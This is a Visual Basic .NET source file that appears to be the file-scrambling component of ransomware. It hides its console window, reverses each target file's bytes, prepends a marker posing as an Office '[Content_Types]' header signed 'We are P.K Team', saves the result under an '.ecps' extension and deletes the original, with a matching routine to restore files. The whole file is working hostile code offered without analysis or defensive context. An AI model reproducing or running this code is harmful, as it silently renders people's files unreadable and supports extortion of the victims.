Imports System.IO

Module Module1

    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr
    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Private Const SW_HIDE As Integer = 0
    Private Const SW_SHOW As Integer = 5
    Sub Main()
        Console.WindowWidth = 1
        Dim hWndConsole As Integer
        hWndConsole = GetConsoleWindow()

        If hWndConsole <> IntPtr.Zero Then
            ' Hide the console window...
            ShowWindow(hWndConsole, SW_HIDE)

            ' for approx. 3 seconds...
            'Threading.Thread.Sleep(3000)

            ' bring the console window back.
            'ShowWindow(hWndConsole, SW_SHOW)
        End If
        Try
            Dim args() As String = System.Environment.GetCommandLineArgs()
            If Microsoft.VisualBasic.Right(args(1), 4).Equals("ECPS") Or Microsoft.VisualBasic.Right(args(1), 4).Equals("ecps") Then
                dec(args(1).ToString)
            Else
                enc(args(1).ToString)
            End If
        Catch

        End Try

    End Sub
    Private Sub enc(full_name As String)
        Dim s As String = "[Content_Types].We are P.K Team "
        Dim mark_arr() As Byte = System.Text.Encoding.Default.GetBytes(s) '문자열 바이트로
        Dim file_tmp() As Byte = New Byte((File.ReadAllBytes(full_name).Length - 1)) {} '파일 바이트 배열 생성
        Array.Copy(File.ReadAllBytes(full_name), file_tmp, File.ReadAllBytes(full_name).Length) '파일 바이트 배열 받기

        Array.Reverse(file_tmp) ' 파일 바이트 재배열

        IO.File.WriteAllBytes(full_name & ".ecps", Combine(mark_arr, file_tmp))

        My.Computer.FileSystem.DeleteFile(full_name)

    End Sub
    Private Sub dec(full_name As String)

        Dim s As String = "[Content_Types].We are P.K Team "
        Dim mark_arr() As Byte = System.Text.Encoding.Default.GetBytes(s) '문자열 바이트로
        Dim file_tmp() As Byte = New Byte((File.ReadAllBytes(full_name).Length - 1)) {} '파일 바이트 배열 생성
        Array.Copy(File.ReadAllBytes(full_name), file_tmp, File.ReadAllBytes(full_name).Length) '파일 바이트 배열 받기
        Dim dec_arr() As Byte = New Byte((file_tmp.Length - mark_arr.Length - 1)) {} '파일 바이트 배열 생성
        Array.ConstrainedCopy(file_tmp, mark_arr.Length, dec_arr, 0, file_tmp.Length - mark_arr.Length)
        Array.Reverse(dec_arr) ' 파일 바이트 재배열


        IO.File.WriteAllBytes(Microsoft.VisualBasic.Left(full_name, full_name.Length - 5), dec_arr)

        My.Computer.FileSystem.DeleteFile(full_name)

    End Sub
    Private Function Combine(a As Byte(), b As Byte()) As Byte()


        Dim c As Byte() = New Byte(a.Length + (b.Length - 1)) {}

        System.Buffer.BlockCopy(a, 0, c, 0, a.Length)

        System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length)

        Return c
    End Function



End Module
